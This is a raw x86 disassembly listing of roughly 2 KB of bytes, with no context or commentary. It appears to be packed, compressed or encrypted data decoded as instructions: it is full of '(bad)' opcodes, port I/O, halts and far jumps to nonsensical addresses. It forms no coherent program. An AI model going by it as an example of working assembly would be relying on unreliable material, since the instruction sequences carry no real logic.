  414bbe:	call   DWORD PTR [edx+esi*2-0x4c]
  414bc2:	arpl   WORD PTR [ebp-0x14],cx
  414bc5:	or     BYTE PTR [esi],dl
  414bc7:	iret   
  414bc8:	mov    al,ds:0x9f7abdb5
  414bcd:	pushf  
  414bce:	outs   dx,BYTE PTR ds:[esi]
  414bcf:	les    ecx,FWORD PTR [ecx+0x2179610]
  414bd5:	jmp    0x332f507
  414bda:	xchg   ebp,eax
  414bdb:	in     al,0x99
  414bdd:	jno    0x414bf0
  414bdf:	push   es
  414be0:	adc    BYTE PTR [ebx+0x1a12aa94],bh
  414be6:	sbb    eax,0x31c93bf9
  414beb:	js     0x414c34
  414bed:	inc    edi
  414bee:	mov    edi,0x70192571
  414bf3:	jge    0x414c63
  414bf5:	pop    es
  414bf6:	fcmovnbe st,st(0)
  414bf8:	mov    esp,0x967b5aef
  414bfd:	push   esp
  414bfe:	mov    ah,BYTE PTR [edi+0x8]
  414c01:	imul   esp,DWORD PTR ss:[ebx+0x3a44eeea],0x39
  414c09:	data16 fwait
  414c0b:	lods   al,BYTE PTR ds:[esi]
  414c0c:	inc    eax
  414c0d:	fucomi st,st(2)
  414c0f:	jno    0x414c1b
  414c11:	fiadd  DWORD PTR [ebx]
  414c13:	xor    al,0xf5
  414c15:	mov    ebp,0x11407171
  414c1a:	sbb    BYTE PTR [ebp-0x1],bl
  414c1d:	add    ah,BYTE PTR [eax+0x5b]
  414c20:	faddp  st(5),st
  414c22:	sub    BYTE PTR [ecx-0x3a],ah
  414c25:	fwait
  414c26:	les    edi,FWORD PTR [edx+0x5cbddad2]
  414c2c:	in     al,0x8d
  414c2e:	add    BYTE PTR [esi+0x721e7849],dl
  414c34:	scas   eax,DWORD PTR es:[edi]
  414c35:	mov    cl,0xa6
  414c37:	dec    esi
  414c38:	imul   ecx,DWORD PTR [ebp-0x91613dc],0xffffffc1
  414c3f:	dec    eax
  414c40:	dec    edx
  414c41:	bound  esp,QWORD PTR [eax-0x295f4398]
  414c47:	loopne 0x414c43
  414c49:	in     eax,0xe7
  414c4b:	out    dx,al
  414c4c:	fistp  QWORD PTR [ecx]
  414c4e:	xchg   ebp,eax
  414c4f:	(bad)  
  414c51:	add    BYTE PTR [edx+0x4],0xab
  414c55:	cwd    
  414c57:	push   ebp
  414c58:	mov    DWORD PTR [ebp-0x5744b832],edx
  414c5e:	stc    
  414c5f:	mov    ch,0x78
  414c61:	inc    ch
  414c63:	add    DWORD PTR ds:0x32aee920,0x5dfda703
  414c6d:	mov    ah,0xb9
  414c6f:	fwait
  414c70:	jg     0x414ce3
  414c72:	push   ss
  414c73:	cli    
  414c74:	xchg   edi,eax
  414c75:	hlt    
  414c76:	ss pop ds
  414c78:	sub    esi,esp
  414c7a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  414c7b:	add    bl,BYTE PTR [eax+0x38]
  414c7e:	fldenv [eax-0x1b67b212]
  414c84:	mov    dl,0x8f
  414c86:	aam    0xea
  414c88:	sti    
  414c89:	mov    al,ds:0x4943bd82
  414c8e:	or     ebx,edx
  414c90:	leave  
  414c91:	mov    eax,0xbfcf1e1a
  414c96:	jl     0x414c6d
  414c98:	in     eax,dx
  414c99:	test   al,0xa
  414c9b:	(bad)  
  414c9c:	fstp   st(6)
  414c9e:	hlt    
  414c9f:	ror    BYTE PTR [ebp-0x1dd70980],0x8
  414ca6:	and    DWORD PTR [edx],0x7fc7a41
  414cac:	(bad)  
  414cad:	js     0x414cd6
  414caf:	inc    ebx
  414cb0:	mov    BYTE PTR ds:0xc8d1124c,bl
  414cb6:	mov    al,ds:0xe7403a0
  414cbb:	js     0x414c6e
  414cbd:	loop   0x414d32
  414cbf:	mov    ch,0x9d
  414cc1:	or     eax,0x4eb206b4
  414cc6:	mov    edx,0x6cc5d24e
  414ccb:	in     eax,0x63
  414ccd:	xor    BYTE PTR [eax-0x6c],0x49
  414cd1:	adc    eax,0x33b3b4dd
  414cd6:	lahf   
  414cd7:	je     0x414d38
  414cd9:	leave  
  414cda:	cmp    dl,BYTE PTR [edx]
  414cdc:	aaa    
  414cdd:	ret    0xe55
  414ce0:	or     ah,BYTE PTR [ecx-0x31]
  414ce3:	cdq    
  414ce4:	push   esp
  414ce5:	xor    BYTE PTR ds:0x42ba0aeb,bh
  414ceb:	jmp    0xd1b84993
  414cf0:	jae    0x414d5f
  414cf2:	je     0x414ca8
  414cf4:	jg     0x414c7e
  414cf6:	out    dx,eax
  414cf7:	hlt    
  414cf8:	jmp    DWORD PTR [edi+0x16]
  414cfb:	jb     0x414c8d
  414cfd:	cmp    eax,0x9bcf5233
  414d02:	jp     0x414d82
  414d04:	add    al,0xf
  414d06:	sub    BYTE PTR [edi],cl
  414d08:	mov    ds:0x6191627,eax
  414d0d:	fstp   QWORD PTR [edx+0x1d]
  414d10:	mov    esp,0xefa4412e
  414d15:	imul   ecx,ebp,0xa1721157
  414d1b:	xor    DWORD PTR [ebx+0x39],ebp
  414d1e:	mov    edi,0xda8b8d8c
  414d23:	outs   dx,DWORD PTR ds:[esi]
  414d24:	cmp    ebp,DWORD PTR [ecx+eax*4-0x32]
  414d28:	xchg   ebx,eax
  414d29:	sbb    eax,0xe92e6e5
  414d2e:	je     0x414d2b
  414d30:	or     DWORD PTR [ecx+edi*2],edi
  414d33:	sar    BYTE PTR [ebx+0x456777fb],cl
  414d39:	pop    es
  414d3a:	or     BYTE PTR [ebx-0x9],al
  414d3d:	aaa    
  414d3e:	add    al,0xb0
  414d40:	xchg   BYTE PTR [ebx+ecx*4-0x1404321e],ah
  414d47:	jae    0x414cf0
  414d49:	sub    cl,ah
  414d4b:	dec    ebp
  414d4c:	push   es
  414d4d:	sbb    BYTE PTR [ebx-0x790cc24e],ah
  414d53:	fdiv   st(1),st
  414d55:	loopne 0x414d43
  414d57:	lods   al,BYTE PTR ds:[esi]
  414d58:	or     BYTE PTR [ebx+0x70],dl
  414d5b:	adc    BYTE PTR [ebx+0x63],0x41
  414d5f:	inc    eax
  414d60:	shl    ebp,1
  414d62:	and    bh,BYTE PTR [esi]
  414d64:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  414d65:	fwait
  414d66:	je     0x414d03
  414d68:	xor    ch,BYTE PTR [ebx-0x234bf156]
  414d6e:	(bad)  
  414d70:	ror    ebx,1
  414d72:	ret    0x315f
  414d75:	bound  esi,QWORD PTR [ebx]
  414d77:	test   al,0xd6
  414d79:	jecxz  0x414db1
  414d7b:	mov    BYTE PTR [edi-0x4490eb1d],dl
  414d81:	push   eax
  414d82:	dec    eax
  414d83:	sub    ah,BYTE PTR [eax+0x34784f51]
  414d89:	es jae 0x414d17
  414d8c:	xor    eax,0x43d71202
  414d91:	pop    ebx
  414d92:	jne    0x414d41
  414d94:	sub    al,0x67
  414d96:	sub    DWORD PTR [esi-0x6ef21222],ebp
  414d9c:	mov    esi,0xc67d03f4
  414da1:	repz les edi,FWORD PTR [ecx+eax*1+0x3a2bdf14]
  414da9:	cli    
  414daa:	push   es
  414dab:	scas   eax,DWORD PTR es:[edi]
  414dac:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  414dad:	and    al,dl
  414daf:	sub    DWORD PTR [edx],ebx
  414db1:	fxch   st(6)
  414db3:	pop    edi
  414db4:	pop    bp
  414db6:	jb     0x414def
  414db8:	push   ebp
  414db9:	xchg   edi,eax
  414dba:	dec    esp
  414dbb:	sahf   
  414dbc:	or     ch,BYTE PTR [ecx]
  414dbe:	xor    al,0xc5
  414dc0:	out    0xc3,eax
  414dc2:	sbb    al,0xe4
  414dc4:	fiadd  DWORD PTR [esp+ebx*2]
  414dc7:	arpl   WORD PTR [edi-0x7ef44e8],ax
  414dcd:	mov    ds:0xb4d8903e,al
  414dd2:	cdq    
  414dd3:	js     0x414e42
  414dd5:	jmp    0x414de1
  414dd7:	sub    eax,0x630cfdd
  414ddc:	fld    QWORD PTR [ebp+0x39]
  414ddf:	outs   dx,DWORD PTR ds:[esi]
  414de0:	push   esp
  414de1:	(bad)  
  414de2:	ds xchg ecx,eax
  414de4:	mov    al,0x3b
  414de6:	and    dl,BYTE PTR [eax-0x46]
  414de9:	cmp    ebp,esi
  414deb:	daa    
  414dec:	xchg   DWORD PTR [ebx-0x77],ebx
  414def:	inc    esp
  414df0:	inc    eax
  414df1:	inc    eax
  414df2:	(bad)  
  414df3:	in     al,0x14
  414df5:	pop    esi
  414df6:	dec    esi
  414df7:	into   
  414df8:	retf   
  414df9:	hlt    
  414dfa:	push   esp
  414dfb:	loop   0x414dd9
  414dfd:	jge    0x414d9a
  414dff:	xchg   edi,eax
  414e00:	outs   dx,DWORD PTR ds:[esi]
  414e01:	or     al,0x15
  414e03:	inc    ebp
  414e04:	out    dx,al
  414e05:	jp     0x414dee
  414e07:	cs fwait
  414e09:	stos   BYTE PTR es:[edi],al
  414e0a:	or     BYTE PTR [ecx-0x8],dl
  414e0d:	mov    DWORD PTR [esi-0x55],esi
  414e10:	jns    0x414dc8
  414e12:	aas    
  414e13:	xchg   ebp,eax
  414e14:	push   0xffffffb0
  414e16:	dec    eax
  414e17:	push   ds
  414e18:	leave  
  414e19:	dec    ch
  414e1b:	xor    ebp,DWORD PTR [edx]
  414e1d:	out    dx,eax
  414e1e:	xchg   esp,eax
  414e1f:	cs mov edx,0x4902b12e
  414e25:	sbb    esi,edi
  414e27:	jb     0x414ea2
  414e29:	cmp    ebx,edi
  414e2b:	sbb    esi,esi
  414e2d:	popf   
  414e2e:	push   ds
  414e2f:	stos   BYTE PTR es:[edi],al
  414e30:	mov    edx,0x33f28be1
  414e35:	sahf   
  414e36:	sub    eax,edi
  414e38:	fist   DWORD PTR cs:[edi]
  414e3b:	clc    
  414e3c:	mov    ds:0x8ad16c8d,al
  414e41:	and    cl,bl
  414e43:	aas    
  414e44:	into   
  414e45:	std    
  414e46:	(bad)  [edx-0x57]
  414e49:	dec    ecx
  414e4a:	call   0x262f:0x592df57f
  414e51:	test   BYTE PTR [ecx],ch
  414e53:	add    ah,BYTE PTR [eax-0x25]
  414e56:	(bad)  
  414e57:	leave  
  414e58:	pop    ecx
  414e59:	and    BYTE PTR [eax+0x33],dl
  414e5c:	sub    eax,0x7d66a099
  414e61:	mov    cl,0x8a
  414e63:	mov    dh,0xb4
  414e65:	imul   ebx,esp,0xffffffb7
  414e68:	add    DWORD PTR [ebx-0x6103f426],edx
  414e6e:	jmp    0x8d23:0x906608a5
  414e75:	adc    edi,DWORD PTR [ebx+0x2a9a659a]
  414e7b:	leave  
  414e7c:	stc    
  414e7d:	imul   esi,DWORD PTR [esp+eiz*2-0x7a],0xffffffd1
  414e82:	test   al,0xaa
  414e84:	lds    edi,FWORD PTR [edi]
  414e86:	mov    ebx,0x818b0baf
  414e8b:	mov    dh,BYTE PTR [edx-0x69]
  414e8e:	push   ecx
  414e8f:	das    
  414e90:	jp     0x414eb0
  414e92:	mov    edx,0xf4c8ccaa
  414e97:	inc    eax
  414e98:	jb     0x414e82
  414e9a:	dec    BYTE PTR [edi-0x52]
  414e9d:	(bad)  
  414e9f:	pop    ecx
  414ea0:	leave  
  414ea1:	push   es
  414ea2:	add    DWORD PTR [esi-0x3],0x59
  414ea6:	fiadd  WORD PTR [eax]
  414ea8:	js     0x414ea9
  414eaa:	fcom   DWORD PTR [esi+0x14]
  414ead:	ins    DWORD PTR es:[edi],dx
  414eae:	mov    dl,0x6c
  414eb0:	jp     0x414ec4
  414eb2:	or     eax,DWORD PTR [ebx+edx*4-0x37]
  414eb6:	inc    ebp
  414eb7:	imul   esp,DWORD PTR [ecx],0x7a
  414eba:	xor    eax,0xa83c6fbf
  414ebf:	outs   dx,DWORD PTR ds:[esi]
  414ec0:	push   edi
  414ec1:	test   cl,bl
  414ec3:	add    ebx,DWORD PTR [ecx-0x22]
  414ec6:	add    al,0x94
  414ec8:	mov    bh,BYTE PTR [esi]
  414eca:	test   al,0x70
  414ecc:	retf   0xbe56
  414ecf:	sub    al,0xce
  414ed1:	les    ebx,FWORD PTR [eax+0x67258325]
  414ed7:	dec    esi
  414ed8:	outs   dx,DWORD PTR ds:[esi]
  414ed9:	mov    bl,0x2b
  414edb:	mov    ?,ebp
  414edd:	xor    bl,BYTE PTR [ebp+0x6dcc88a7]
  414ee3:	push   0xffffffa3
  414ee5:	cwde   
  414ee6:	ins    DWORD PTR es:[edi],dx
  414ee7:	cli    
  414ee8:	push   0x8d8e7b91
  414eed:	xchg   esp,eax
  414eee:	aad    0x8b
  414ef0:	adc    ecx,DWORD PTR [edi]
  414ef2:	scas   al,BYTE PTR es:[edi]
  414ef3:	mov    al,0x92
  414ef5:	mov    ds:0x98363184,eax
  414efa:	push   edi
  414efb:	sbb    eax,0x91fdd4fc
  414f00:	fwait
  414f01:	fs ss es mov dh,0xa9
  414f06:	xchg   edi,eax
  414f07:	jge    0x414ef7
  414f09:	mov    ebp,0xc864de4f
  414f0e:	lea    eax,[ebx+0x41]
  414f11:	add    BYTE PTR [ebx*1+0x6fc899],0x4c
  414f19:	mov    BYTE PTR [esi+0x15],bh
  414f1c:	daa    
  414f1d:	and    esi,ebp
  414f1f:	sbb    ecx,DWORD PTR [esi+0x32]
  414f22:	dec    edi
  414f23:	add    BYTE PTR [edx],dl
  414f25:	(bad)  
  414f26:	not    BYTE PTR [eax]
  414f28:	ret    
  414f29:	popa   
  414f2a:	mov    BYTE PTR [edi+0x52],al
  414f2d:	(bad)  
  414f2e:	jnp    0x414f3d
  414f30:	(bad)  
  414f31:	lea    ebx,[edx-0x49cb752b]
  414f37:	je     0x414ed1
  414f39:	mov    esp,0x28755f88
  414f3e:	nop
  414f3f:	jle    0x414fa5
  414f41:	dec    edi
  414f42:	pop    ds
  414f43:	dec    edi
  414f44:	xchg   edx,eax
  414f45:	call   0xd40b7ee6
  414f4a:	xchg   ebp,eax
  414f4b:	mov    dh,0x4c
  414f4d:	lahf   
  414f4e:	sti    
  414f4f:	ret    0xd802
  414f52:	loop   0x414f90
  414f54:	xor    al,0x9d
  414f56:	xlat   BYTE PTR ds:[ebx]
  414f57:	add    ch,BYTE PTR [edx]
  414f59:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  414f5a:	add    DWORD PTR [ebx+0x67],esi
  414f5d:	popf   
  414f5e:	shl    DWORD PTR [ebx+0x14],1
  414f61:	xchg   BYTE PTR [ecx],al
  414f63:	mov    ecx,0xc7108e11
  414f68:	test   DWORD PTR [esi+0x581443fb],ebx
  414f6e:	xchg   ebx,eax
  414f6f:	mov    ?,WORD PTR [eax+0x33]
  414f72:	rol    DWORD PTR [ebx-0x70],1
  414f75:	push   ecx
  414f76:	arpl   WORD PTR [ebp+0x3c53689],sp
  414f7c:	dec    ecx
  414f7d:	inc    esi
  414f7e:	imul   ecx,DWORD PTR [ebx+0x5107e9af],0x57
  414f85:	pop    ecx
  414f86:	xchg   ebx,eax
  414f87:	test   eax,0xac234fc8
  414f8c:	popa   
  414f8d:	sahf   
  414f8e:	mov    al,0x60
  414f90:	gs dec esp
  414f92:	mov    ah,0x34
  414f94:	and    bh,BYTE PTR [ebp-0x2c]
  414f97:	loop   0x414fd7
  414f99:	mov    edx,0xbb88afa6
  414f9e:	mov    ebx,0xe2490975
  414fa3:	(bad)  
  414fa4:	mov    ebp,0x9c901c26
  414fa9:	loope  0x414fe3
  414fab:	lods   al,BYTE PTR ds:[esi]
  414fac:	shr    BYTE PTR [ebx+edi*4+0x262de896],cl
  414fb3:	pop    ss
  414fb4:	(bad)  
  414fb6:	mov    eax,ds:0xd74207c1
  414fbb:	dec    edx
  414fbc:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  414fbd:	xor    esi,esi
  414fbf:	fldcw  WORD PTR [esi-0x49]
  414fc2:	dec    esi
  414fc3:	sub    DWORD PTR [ebp+0xf704304],ebx
  414fc9:	add    bh,BYTE PTR [ecx]
  414fcb:	dec    ebx
  414fcc:	iret   
  414fcd:	aam    0xbf
  414fcf:	inc    esp
  414fd0:	rol    DWORD PTR [ecx+eax*4+0x2b],cl
  414fd4:	push   0xc968b563
  414fd9:	lods   eax,DWORD PTR ds:[esi]
  414fda:	sbb    edi,DWORD PTR [ebp+0x52450593]
  414fe0:	cs pushf 
  414fe2:	push   edx
  414fe3:	cld    
  414fe4:	dec    ebx
  414fe5:	add    bh,BYTE PTR [ebx-0x5a]
  414fe8:	mov    DWORD PTR [eax+0x737d3299],edx
  414fee:	sbb    al,0x88
  414ff0:	mov    ds:0x13a829d,al
  414ff5:	push   esp
  414ff6:	cld    
  414ff7:	retf   0xd1ba
  414ffa:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  414ffb:	scas   al,BYTE PTR es:[edi]
  414ffc:	iret   
  414ffd:	mov    al,0xa2
  414fff:	jge    0x415005
  415001:	pop    ebp
  415002:	es jns 0x414f86
  415005:	xor    eax,DWORD PTR [eax-0x7665fb9f]
  41500b:	and    DWORD PTR [ebx],0x2a
  41500e:	sbb    BYTE PTR [edi-0x755a09a8],0xbf
  415015:	repnz mov al,ds:0x9a9b3ee7
  41501b:	data16 cmc 
  41501d:	mov    bh,0x16
  41501f:	jge    0x414fcd
  415021:	lods   al,BYTE PTR ds:[esi]
  415022:	rcl    DWORD PTR [ebp+ebp*1-0x2f],cl
  415026:	shl    BYTE PTR ds:0x73569887,0x6c
  41502d:	add    DWORD PTR [esi],ebx
  41502f:	addr16 and eax,0xff502e1d
  415035:	in     al,dx
  415036:	pop    ebx
  415037:	ss daa 
  415039:	inc    ecx
  41503a:	mov    ebx,0x6c1241fc
  41503f:	imul   edx,DWORD PTR [ebx-0x2d],0x64
  415043:	icebp  
  415044:	test   eax,0xf7d2afe4
  415049:	retf   0x6fcd
  41504c:	jmp    0xcc20:0xf752db53
  415053:	mov    cl,bl
  415055:	sti    
  415056:	jnp    0x4150d6
  415058:	div    BYTE PTR [edi-0x2b]
  41505b:	push   edx
  41505c:	inc    ebx
  41505d:	inc    ebx
  41505e:	(bad)  
  41505f:	jmp    0xab74fd7d
  415064:	fcomi  st,st(1)
  415066:	scas   eax,DWORD PTR es:[edi]
  415067:	sti    
  415068:	jne    0x415045
  41506a:	jne    0x414ffb
  41506c:	leave  
  41506d:	xchg   esp,eax
  41506e:	xlat   BYTE PTR ss:[ebx]
  415070:	xor    edi,ecx
  415072:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  415073:	popf   
  415074:	loopne 0x415016
  415076:	scas   al,BYTE PTR es:[edi]
  415077:	rol    dh,cl
  415079:	out    0x15,eax
  41507b:	punpckhbw mm5,QWORD PTR [ecx]
  41507e:	test   cl,cl
  415080:	mov    esi,0x25f46006
  415085:	lock xor eax,0x5e224e03
  41508b:	xor    bh,0xa8
  41508e:	out    0xe,al
  415090:	pop    esp
  415091:	gs mov ebp,0xd85aad03
  415097:	inc    esi
  415098:	xchg   edx,eax
  415099:	jne    0x415024
  41509b:	sti    
  41509c:	cmp    BYTE PTR ds:0x6715e70,dh
  4150a2:	and    eax,0x34382c93
  4150a7:	out    0xd0,al
  4150a9:	mov    esp,0x863717c4
  4150ae:	sub    dl,bh
  4150b0:	push   esp
  4150b1:	xchg   ecx,eax
  4150b2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4150b3:	push   eax
  4150b4:	mov    BYTE PTR [esi],bh
  4150b6:	mov    esp,edi
  4150b8:	outs   dx,BYTE PTR ds:[esi]
  4150b9:	pop    ecx
  4150ba:	jns    0x4150a0
  4150bc:	rol    ebp,1
  4150be:	pop    ds
  4150bf:	cwde   
  4150c0:	imul   edx,DWORD PTR [ebp-0x2f],0x8
  4150c4:	nop
  4150c5:	jb     0x4150a2
  4150c7:	ret    
  4150c8:	test   eax,0xc161f839
  4150cd:	mov    DWORD PTR [esi+0x6f67d2f6],edi
  4150d3:	fidiv  WORD PTR [edx+0x29]
  4150d6:	dec    edi
  4150d7:	xlat   BYTE PTR ds:[ebx]
  4150d8:	cwde   
  4150d9:	pop    ds
  4150da:	fimul  DWORD PTR ds:[eax-0x247c96df]
  4150e1:	hlt    
  4150e2:	pop    edi
  4150e3:	mov    cl,0x72
  4150e5:	cld    
  4150e6:	fstp   DWORD PTR [edx+ebp*4-0x46]
  4150ea:	sahf   
  4150eb:	loop   0x4150f2
  4150ed:	test   BYTE PTR ds:0x5dcff1ff,ah
  4150f3:	repnz inc ebx
  4150f5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4150f6:	jmp    0x2b4fb9a4
  4150fb:	xchg   edi,eax
  4150fc:	mov    bh,0x74
  4150fe:	mov    edi,0xba27d19f
  415103:	repz cwde 
  415105:	pop    ds
  415106:	mov    al,0xdc
  415108:	sbb    esi,DWORD PTR [ebp-0x5e]
  41510b:	mov    bl,0x19
  41510d:	sar    BYTE PTR [edx],0x98
  415110:	push   es
  415111:	mov    ecx,DWORD PTR [ebp+0x25]
  415114:	fcmovnu st,st(1)
  415116:	mov    al,0x9a
  415118:	stos   BYTE PTR es:[edi],al
  415119:	add    BYTE PTR [ebp-0x228f9c1],cl
  41511f:	ficomp WORD PTR [edi+0x2c2ed38d]
  415125:	sbb    bl,BYTE PTR [eax+edi*4-0x77]
  415129:	jle    0x41510a
  41512b:	data16 xor al,0x3a
  41512e:	lock sub al,0x47
  415131:	mov    DWORD PTR [eax+0x32],esi
  415134:	and    al,0x4d
  415136:	call   0xdeff292c
  41513b:	cmp    DWORD PTR [edi+0x71],ebx
  41513e:	mov    bh,0x5
  415140:	or     al,0x1
  415142:	or     eax,0x9cdd434f
  415147:	out    dx,al
  415148:	add    ebp,DWORD PTR ds:0x2934f67e
  41514e:	pop    edi
  41514f:	add    eax,eax
  415151:	sub    ebp,ebx
  415153:	pop    esi
  415154:	aam    0x95
  415156:	pop    esi
  415157:	and    ecx,eax
  415159:	mov    ah,0xb9
  41515b:	orps   xmm2,XMMWORD PTR [esi+0xbd456c6]
  415162:	xor    bl,BYTE PTR [eax-0x7d4f1fd6]
  415168:	hlt    
  415169:	adc    al,0x65
  41516b:	mov    ah,0x32
  41516d:	adc    BYTE PTR [edx+ebp*2-0x6e],0x3c
  415172:	call   0x4a59:0x18d1b279
  415179:	mov    eax,ds:0x85c220d5
  41517e:	add    DWORD PTR [ecx+0x672ebcff],eax
  415184:	in     al,dx
  415185:	stos   BYTE PTR es:[edi],al
  415186:	(bad)  
  415188:	push   ebp
  415189:	push   esi
  41518a:	mov    esp,0x8043a77e
  41518f:	mul    BYTE PTR [ecx-0x1a]
  415192:	sbb    ebp,ecx
  415194:	bound  ecx,QWORD PTR [ebx-0xb72c1ad]
  41519a:	lds    esi,FWORD PTR [edx]
  41519c:	lock dec esp
  41519e:	or     DWORD PTR [ecx],0x9a06ba0d
  4151a4:	mov    ah,0x6
  4151a6:	jg     0x41521f
  4151a8:	dec    edi
  4151a9:	stos   BYTE PTR es:[edi],al
  4151aa:	call   0xabb4864e
  4151af:	or     ah,BYTE PTR [eax-0x1589b673]
  4151b5:	and    ebp,DWORD PTR [esi+0x55422e8e]
  4151bb:	ret    
  4151bc:	loope  0x415236
  4151be:	(bad)  [edi*2+0x2b18e698]
  4151c5:	ss sub esi,esp
  4151c8:	mov    eax,ds:0x1c492ee1
  4151cd:	jecxz  0x415248
  4151cf:	xchg   edi,eax
  4151d0:	sar    dl,cl
  4151d2:	push   edx
  4151d3:	(bad)  
  4151d4:	xchg   esp,eax
  4151d5:	add    DWORD PTR fs:[edx+ecx*1],ebx
  4151d9:	aas    
  4151da:	xor    ebx,DWORD PTR [ecx+0x5b183996]
  4151e0:	xchg   DWORD PTR [esp+ecx*8],esp
  4151e3:	add    ecx,ebx
  4151e5:	out    0x5a,eax
  4151e7:	sbb    DWORD PTR [ebx],ebx
  4151e9:	frstor [ecx]
  4151eb:	jae    0x41520d
  4151ed:	aas    
  4151ee:	dec    ecx
  4151ef:	aam    0x20
  4151f1:	popf   
  4151f2:	pusha  
  4151f3:	sub    ah,BYTE PTR [ebp+0x61]
  4151f6:	scas   eax,DWORD PTR es:[edi]
  4151f7:	(bad)  
  4151f8:	pop    esi
  4151f9:	mov    esp,0x54bd4862
  4151fe:	sbb    BYTE PTR [esi-0x26574bb2],bl
  415204:	pop    ds
  415205:	stos   BYTE PTR es:[edi],al
  415206:	xor    bh,BYTE PTR [ebx-0xc2b660b]
  41520c:	adc    ebp,esi
  41520e:	shl    BYTE PTR [ecx-0x45c045e3],0x17
  415215:	lods   eax,DWORD PTR ds:[esi]
  415216:	cmp    eax,0xe31071eb
  41521b:	int3   
  41521c:	push   cs
  41521d:	leave  
  41521e:	jecxz  0x4151de
  415220:	cmp    eax,0x5bc4842e
  415225:	jp     0x415219
  415227:	push   cs
  415228:	mov    cl,BYTE PTR [ebx]
  41522a:	les    edx,FWORD PTR [ebx+0x30]
  41522d:	lock (bad) 
  41522f:	out    dx,eax
  415230:	xor    eax,0xa08db2dc
  415235:	adc    ecx,eax
  415237:	dec    ebx
  415238:	push   edi
  415239:	xor    cl,dl
  41523b:	sbb    BYTE PTR [esp+eiz*2+0x3f5aec73],dh
  415242:	retf   
  415243:	adc    ebx,DWORD PTR [ecx]
  415245:	jmp    0xcc2b1291
  41524a:	sub    DWORD PTR [edx],esp
  41524c:	leave  
  41524d:	imul   ecx,DWORD PTR [eax+0x2e23184d],0x4407f3cb
  415257:	mov    DWORD PTR [eax-0x66],edi
  41525a:	mov    BYTE PTR [edx],ch
  41525c:	enter  0x8557,0xf2
  415260:	call   0x7928:0xa98288e4
  415267:	(bad)  
  415268:	mov    ecx,0x877d385c
  41526d:	jb     0x415291
  41526f:	mov    ebx,0xbceb309f
  415274:	inc    ecx
  415275:	jns    0x415266
  415277:	scas   al,BYTE PTR es:[edi]
  415278:	cmp    ecx,DWORD PTR [edi+0x64c34cdd]
  41527e:	call   0x71d4aa6
  415283:	fdivr  st,st(7)
  415285:	xchg   BYTE PTR [esi+ebp*4+0x2d],dl
  415289:	jae    0x4152d6
  41528b:	jnp    0x415214
  41528d:	jecxz  0x4152be
  41528f:	ficom  DWORD PTR [ecx-0x5a0ec737]
  415295:	jp     0x415226
  415297:	das    
  415298:	adc    eax,0x778bcba7
  41529d:	sub    eax,DWORD PTR [edi+edi*8]
  4152a0:	icebp  
  4152a1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4152a2:	adc    eax,0x8a520833
  4152a7:	or     edx,DWORD PTR [ecx]
  4152a9:	jbe    0x4152ba
  4152ab:	out    dx,al
  4152ac:	mov    eax,DWORD PTR [edi+edx*4+0x264d45cd]
  4152b3:	mov    ebx,0xfe3e1b61
  4152b8:	or     al,0x52
  4152ba:	add    edx,0xddc5a1de
  4152c0:	rol    DWORD PTR [edi+0x75],1
  4152c3:	loopne 0x4152a3
  4152c5:	in     eax,dx
  4152c6:	fwait
  4152c7:	and    DWORD PTR [edi+0x66],0xffffffaa
  4152cb:	and    al,bh
  4152cd:	push   es
  4152ce:	test   DWORD PTR [edx+ecx*8+0x269489c0],edx
  4152d5:	rcpps  xmm2,xmm1
  4152d8:	jno    0x415350
  4152da:	cdq    
  4152db:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4152dc:	hlt    
  4152dd:	dec    DWORD PTR [ebx+0x42fc3c75]
  4152e3:	push   ebp
  4152e4:	call   0x5511:0x1ac2d18c
  4152eb:	aas    
  4152ec:	setns  BYTE PTR [edi+0xe]
  4152f0:	outs   dx,DWORD PTR ds:[esi]
  4152f1:	mov    DWORD PTR [esi],ecx
  4152f3:	mov    edx,ecx
  4152f5:	and    DWORD PTR [esi],0xef7092c1
  4152fb:	loopne 0x4152b4
  4152fd:	shl    BYTE PTR [edx-0x5498e756],1
  415303:	ja     0x415374
  415305:	les    ebx,FWORD PTR [eax+0x1f]
  415308:	sub    al,0xe0
  41530a:	mov    ah,0x19
  41530c:	jecxz  0x415364
  41530e:	in     eax,dx
  41530f:	jl     0x41536d
  415311:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  415312:	adc    eax,0xdbef82f0
  415317:	pop    es
  415318:	cmp    eax,0xdfedbc8
  41531d:	adc    esp,DWORD PTR [esp+ebx*4+0x1c]
  415321:	pop    esi
  415322:	pop    ecx
  415323:	xlat   BYTE PTR ds:[ebx]
  415324:	xchg   esi,eax
  415325:	hlt    
  415326:	out    0x33,eax
  415328:	xchg   esi,eax
  415329:	into   
  41532a:	mov    ebp,eax
  41532c:	push   esp
  41532d:	sub    dl,ah
  41532f:	inc    ebx
  415330:	ins    DWORD PTR es:[edi],dx
  415331:	sub    bl,BYTE PTR [ebp+0x62ccb619]
  415337:	push   0x1f7717ba
  41533c:	ret    
  41533d:	hlt    
  41533e:	sub    BYTE PTR [edi],0xb3
  415341:	lea    ebp,[esi-0x1a2e9ca1]
  415347:	mov    bh,0x75
  415349:	es iret 
  41534b:	scas   al,BYTE PTR es:[edi]
  41534c:	out    0x8c,al
  41534e:	repz loop 0x41536c
  415351:	sbb    BYTE PTR [ecx-0x206a2962],bh
  415357:	xchg   edi,eax
  415358:	cmp    BYTE PTR [ebx],0x80
  41535b:	push   ecx
  41535c:	mov    al,ds:0xb51dac87
  415361:	(bad)  
  415362:	(bad)  
  415363:	popf   
  415364:	in     eax,0xef
  415366:	inc    esi
  415367:	call   0x72776f6a
  41536c:	mov    esi,0x9119841b
  415371:	fsubr  DWORD PTR [edx+ebp*2]
  415374:	mov    al,0x77
  415376:	out    0xe1,eax
  415378:	imul   edi,DWORD PTR [edx-0x64],0xffffffad
  41537c:	cwde   
  41537d:	inc    esi
  41537e:	pop    ss
  41537f:	repz xor ecx,ebx
  415382:	out    0xf9,eax
  415384:	test   eax,0x5d809564
  415389:	cld    
  41538a:	add    al,0x77
  41538c:	add    dh,ah
